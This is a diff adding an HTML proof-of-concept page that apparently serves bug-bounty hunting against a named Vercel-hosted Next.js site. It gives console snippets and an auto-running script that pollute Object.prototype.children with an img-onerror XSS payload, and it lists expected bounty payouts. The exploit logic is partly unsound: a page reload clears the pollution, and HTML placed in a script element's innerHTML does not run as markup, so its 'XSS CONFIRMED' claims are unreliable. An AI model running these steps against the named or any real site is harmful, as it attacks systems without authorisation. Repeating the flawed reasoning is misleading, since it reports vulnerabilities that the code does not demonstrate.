@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Next.js Gadget Trigger Test</title>
+    <style>
+        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
+        .success { color: #00ff00; font-weight: bold; }
+        .fail { color: #ff0000; }
+        .info { color: #00ffff; }
+        .warning { color: #ffff00; }
+        pre { background: #000; padding: 10px; border: 1px solid #333; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <h1>Next.js Prototype Pollution Gadget Trigger Test</h1>
+    <h2>Target: sturdy-octo-memory-three.vercel.app</h2>
+    
+    <div id="status"></div>
+    
+    <h3>The Gadget (Chunk 117):</h3>
+    <pre>
+// Next.js script loading mechanism:
+let o = document.createElement("script");
+if(r) for(let e in r) "children" !== e && o.setAttribute(e, r[e]);
+n ? (o.src = n, o.onload = () => e(), o.onerror = t) 
+  : r && (o.innerHTML = r.children, setTimeout(e))
+
+// Translation:
+// If src (n) is falsy AND attributes (r) exist
+// Then innerHTML = r.children
+// If we pollute Object.prototype.children, r.children inherits our value!
+    </pre>
+    
+    <h3>Trigger Methods:</h3>
+    
+    <div class="warning">
+        <h4>Method 1: Pollute + Reload (RECOMMENDED)</h4>
+        <ol>
+            <li>Open: <a href="https://sturdy-octo-memory-three.vercel.app" target="_blank">https://sturdy-octo-memory-three.vercel.app</a></li>
+            <li>Open Console (F12)</li>
+            <li>Paste this code:</li>
+        </ol>
+        <pre>
+// Pollute children with XSS payload
+Object.prototype.children = "<img/src/onerror=alert('PP_XSS')>";
+
+// Reload to trigger the gadget
+location.reload();
+        </pre>
+        <p>If alert fires → <span class="success">XSS CONFIRMED!</span></p>
+    </div>
+    
+    <div class="warning">
+        <h4>Method 2: Pollute + Navigate</h4>
+        <ol>
+            <li>Open: <a href="https://sturdy-octo-memory-three.vercel.app" target="_blank">https://sturdy-octo-memory-three.vercel.app</a></li>
+            <li>Open Console (F12)</li>
+            <li>Paste:</li>
+        </ol>
+        <pre>
+// Pollute
+Object.prototype.children = "<img/src/onerror=alert('PP_XSS')>";
+
+// Navigate to a different page
+window.location.href = "/login";
+        </pre>
+        <p>The gadget might fire during client-side navigation.</p>
+    </div>
+    
+    <div class="warning">
+        <h4>Method 3: Direct Gadget Simulation</h4>
+        <p>This simulates what the gadget does:</p>
+        <pre>
+// Pollute children
+Object.prototype.children = "<img/src/onerror=alert('PP_XSS')>";
+
+// Simulate the gadget
+let o = document.createElement("script");
+let r = {}; // r inherits from Object.prototype
+// r.children is undefined, so it inherits polluted value
+
+// This is what the gadget does:
+o.innerHTML = r.children; // Sets innerHTML to our payload!
+document.head.appendChild(o);
+// The script element will execute our payload!
+        </pre>
+        <p>This should trigger the alert immediately!</p>
+    </div>
+    
+    <div class="warning">
+        <h4>Method 4: Test on Target Domain</h4>
+        <p>Open this file directly on the target:</p>
+        <pre>
+https://sturdy-octo-memory-three.vercel.app/gadget-trigger-test.html
+        </pre>
+        <p>The auto-test will run and show results.</p>
+    </div>
+    
+    <h3>Expected Results:</h3>
+    <ul>
+        <li><span class="success">If alert('PP_XSS') fires:</span> We have XSS via Prototype Pollution!</li>
+        <li><span class="fail">If no alert:</span> The gadget may not be triggered by our pollution</li>
+    </ul>
+    
+    <h3>Bounty Potential:</h3>
+    <pre>
+PP + XSS = $1,000 - $3,000
+PP + RCE = $5,000 - $25,000
+    </pre>
+    
+    <script>
+        // Auto-test if opened on target
+        if (window.location.hostname === 'sturdy-octo-memory-three.vercel.app') {
+            document.getElementById('status').innerHTML = '<p class="success">Running auto-test on target...</p>';
+            
+            // Test 1: Confirm PP works
+            Object.prototype.titan_test = "polluted";
+            let testObj = {};
+            
+            if (testObj.titan_test === "polluted") {
+                document.getElementById('status').innerHTML += '<p class="success">✓ Prototype Pollution confirmed!</p>';
+                
+                // Test 2: Pollute children
+                Object.prototype.children = "<img/src/onerror=alert('PP_XSS')>";
+                document.getElementById('status').innerHTML += '<p class="warning">⚠ Children polluted with XSS payload</p>';
+                
+                // Test 3: Simulate the gadget
+                try {
+                    let o = document.createElement("script");
+                    let r = {}; // r inherits from Object.prototype
+                    
+                    // This is what the gadget does:
+                    o.innerHTML = r.children;
+                    document.head.appendChild(o);
+                    
+                    document.getElementById('status').innerHTML += '<p class="info">Gadget simulated - check if alert fired!</p>';
+                } catch (e) {
+                    document.getElementById('status').innerHTML += '<p class="fail">Error simulating gadget: ' + e.message + '</p>';
+                }
+            } else {
+                document.getElementById('status').innerHTML += '<p class="fail">✗ Prototype Pollution not working</p>';
+            }
+        } else {
+            document.getElementById('status').innerHTML = '<p class="info">Open this file on the target domain to auto-test</p>';
+        }
+    </script>
+</body>
+</html>
